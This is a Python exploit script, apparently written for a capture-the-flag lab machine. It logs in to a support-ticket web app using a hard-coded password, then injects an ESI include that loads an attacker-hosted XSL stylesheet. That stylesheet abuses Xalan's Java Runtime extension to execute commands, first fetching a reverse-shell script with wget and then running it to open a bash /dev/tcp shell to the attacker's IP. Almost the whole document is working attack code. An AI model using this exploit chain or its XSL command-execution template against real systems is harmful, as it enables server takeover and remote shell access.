#!/usr/bin/env python3

# complete exploit to get access to the server.
# login as elisa to get the cookie.
# stage1:
# then add a new support ticket with esi include xml/xsl (random xsl name) pointing to my server.
# store the ticket number after the ticket has been added.
# copy esi.xml to the random file
# finally request the search, where xsl payload is executed. (download a revshell.sh)
# stage2:
# add a new support ticket with esi include xml/xsl (random xsl name) pointing to my server.
# store the ticket number after the ticket has been added.
# copy esi.xml to the random file
# finally request the search, where xsl payload is executed. (execute revshell.sh)
# xml:
# <?xml version="1.0" encoding="UFT-8"?>
# <root />
# xsl:
# <?xml version="1.0" ?>
#<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
#        <xsl:output method="xml" omit-xml-declaration="yes"/>
#        <xsl:template match="/"
#        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
#         xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
#         <root>
#                 <xsl:variable name="cmd"><![CDATA[FJANK_COMMAND]]></xsl:variable>
#                 <xsl:variable name="rtObj" select="rt:getRuntime()"/>
#                 <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
#                 <xsl:variable name="efgh" select="jv:getInputStream($process)" xmlns:jv="http://xml.apache.org/xalan/java"/> 
#                 <xsl:variable name="ijkl" select="isr:new($efgh)" xmlns:isr="http://xml.apache.org/xalan/java/java.io.InputStreamReader"/> 
#                 <xsl:variable name="mnop" select="br:new($ijkl)" xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"/> 
#                 Process: <xsl:value-of select="$process"/>
#                 Command: <xsl:value-of select="$cmd"/>
#                 RESULT
#                 <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
#                 <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
#                 <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
#                 <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
#                 RESULT END
#         </root>
# </xsl:template>
# </xsl:stylesheet>

# payload 1: wget -O rev.sh http://10.10.14.118/rev.sh
# content: bash -c 'bash -i >& /dev/tcp/10.10.14.118/9001 0>&1'
# payload 2: bash rev.sh


import requests, random, string, shutil
from pwn import *

url = 'http://10.10.10.186:9001/'

def getRandomString():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(6))

# logs in as Elisa to get elisas cookie.
def login():
    data = {'email': 'Elisa@wink.co.uk', 'password': 'Quick4cc3$$'}
    headers = {'Referer': url + 'login.php'}
    res = requests.post(url + 'login.php', 
            data=data, 
            headers=headers, 
            allow_redirects=False)
    setCookie = res.headers['set-cookie']
    idx = setCookie.index('; Path=')
    return setCookie[0:idx].split('=')

def addTicket(cookies, xslName):
    res = requests.get(url + 'ticket.php', cookies=cookies)
    txt = res.text
    str1 = 'name="id" value="'
    idx1 = txt.index(str1) + len(str1)
    idx2 = txt.index('"', idx1)
    ticketId = txt[idx1:idx2]
    data = {'title': 'test', 'msg': '<esi:include src="http://10.10.14.118/{}.xml" stylesheet="http://10.10.14.118/{}.xsl"></esi:include>'.format(xslName, xslName), 'id': ticketId}
    res = requests.post(url + 'ticket.php', cookies=cookies, data=data)
    return ticketId

def searchTicket(cookies, xslName):
    res = requests.get(url + 'search.php', cookies=cookies, params={'search':xslName})
    print(res.text)

def copyFile(newName, cmd):
    shutil.copyfile('./www/tmpl/esi.xsl', './www/{}.xsl'.format(newName))
    shutil.copyfile('./www/tmpl/xml.xml', './www/{}.xml'.format(newName))
    file = open('./www/{}.xsl'.format(newName), 'r')
    content = file.read()
    file.close()
    file = open('./www/{}.xsl'.format(newName), 'w')
    file.write(content.replace('FJANK_COMMAND', cmd))
    file.close()


def executeStage(no, revShName=''):
    xslName = getRandomString()
    cmd = ''
    if no == 1:
        cmd = 'wget -O {}.sh http://10.10.14.118/rev.sh'.format(xslName)
    else:
        cmd = 'bash {}.sh'.format(revShName)
    ticketId = addTicket({cookie[0]:cookie[1]}, xslName)
    log.info('added ticket id {} referencing {}.xsl/xml'.format(ticketId, xslName))
    copyFile(xslName, cmd)
    log.info('Made a filecopy ({}.xsl), ready to be requested'.format(xslName))
    searchTicket({cookie[0]:cookie[1]}, ticketId)
    return xslName

log.info('Make sure to have a webserver on port 80 to deliver xml/xsl/revshell, and a revshell listener on port 9001, press enter when ready.')
input()
cookie = login()
log.info('Logged in')
revShName = executeStage(1)
log.info('Executed stage 1 downloaded revshell to {}.sh.'.format(revShName))
executeStage(2, revShName)
log.info('Executed, stage 2, you should have a shell.')


